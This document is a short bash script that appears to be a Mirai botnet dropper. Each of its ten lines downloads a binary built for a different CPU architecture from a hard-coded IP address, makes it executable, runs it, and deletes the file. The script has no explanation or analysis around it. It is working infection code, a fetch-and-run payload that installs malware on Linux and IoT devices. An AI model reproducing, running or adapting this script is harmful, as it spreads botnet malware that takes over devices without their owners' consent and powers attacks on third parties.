#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.mips; chmod +x mirai.mips; ./mirai.mips; rm -rf mirai.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.mipsel; chmod +x mirai.mipsel; ./mirai.mipsel; rm -rf mirai.mipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.m68k; chmod +x mirai.m68k; ./mirai.m68k; rm -rf mirai.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.arm7; chmod +x mirai.arm7; ./mirai.arm7; rm -rf mirai.arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.arm6; chmod +x mirai.arm6; ./mirai.arm6; rm -rf mirai.arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.arm5; chmod +x mirai.arm5; ./mirai.arm5; rm -rf mirai.arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.arm; chmod +x mirai.arm; ./mirai.arm; rm -rf mirai.arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.sh4; chmod +x mirai.sh4; ./mirai.sh4; rm -rf mirai.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.spc; chmod +x mirai.spc; ./mirai.spc; rm -rf mirai.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.242.232.9/mirai.x86; chmod +x mirai.x86; ./mirai.x86; rm -rf mirai.x86